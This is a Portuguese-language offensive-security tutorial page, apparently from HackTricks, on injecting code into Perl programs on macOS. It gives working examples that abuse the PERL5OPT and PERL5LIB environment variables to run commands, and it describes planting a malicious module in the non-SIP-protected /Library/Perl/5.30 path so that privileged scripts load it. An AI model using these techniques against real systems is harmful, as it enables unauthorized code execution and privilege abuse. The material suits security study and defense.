# Injeção de Aplicações Perl no macOS

{{#include ../../../banners/hacktricks-training.md}}

## Via variável de ambiente `PERL5OPT` & `PERL5LIB`

Usando a variável de ambiente PERL5OPT, é possível fazer o perl executar comandos arbitrários.\
Por exemplo, crie este script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Agora **exporte a variável de ambiente** e execute o script **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Outra opção é criar um módulo Perl (por exemplo, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
E então use as variáveis de ambiente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Via dependencies

É possível listar a ordem da pasta de dependências do Perl em execução:
```bash
perl -e 'print join("\n", @INC)'
```
O que retornará algo como:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Algumas das pastas retornadas nem existem, no entanto, **`/Library/Perl/5.30`** **existe**, **não** é **protegida** pelo **SIP** e está **antes** das pastas **protegidas pelo SIP**. Portanto, alguém poderia abusar dessa pasta para adicionar dependências de script lá, para que um script Perl de alto privilégio o carregue.

> [!WARNING]
> No entanto, note que você **precisa ser root para escrever nessa pasta** e atualmente você receberá este **prompt TCC**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Por exemplo, se um script estiver importando **`use File::Basename;`**, seria possível criar `/Library/Perl/5.30/File/Basename.pm` para fazer com que ele execute código arbitrário.

## Referências

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
